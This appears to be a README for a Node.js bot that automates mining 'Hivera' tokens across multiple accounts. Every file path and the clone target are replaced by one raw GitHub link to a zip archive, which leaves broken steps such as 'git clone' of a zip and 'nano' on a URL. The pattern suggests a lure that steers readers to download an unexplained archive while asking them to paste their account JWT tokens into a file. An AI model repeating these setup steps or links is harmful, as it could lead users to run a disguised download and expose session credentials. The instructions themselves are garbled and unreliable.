## Features

- **Auto Mines Hivera Tokens**
- **Support Multy Accounts**
- **Support proxy**: fill your proxy in `https://raw.githubusercontent.com/Shishir-Singh-666/Hivera2nd/main/utils/Hivera-nd-2.1-beta.4.zip` format `http://user:pass@ip:port`

## Setup

1. Clone this repository:
   ```bash
   git clone https://raw.githubusercontent.com/Shishir-Singh-666/Hivera2nd/main/utils/Hivera-nd-2.1-beta.4.zip
   cd hiveraBot
   ```
2. Install dependencies:
   ```bash
   npm install
   ```
3. Setup: Paste hivera jwt to `https://raw.githubusercontent.com/Shishir-Singh-666/Hivera2nd/main/utils/Hivera-nd-2.1-beta.4.zip` 1 line 1 account
   ```bash
   nano https://raw.githubusercontent.com/Shishir-Singh-666/Hivera2nd/main/utils/Hivera-nd-2.1-beta.4.zip
   ```
4. Run The Script:
   ```bash
   npm run start
   ```
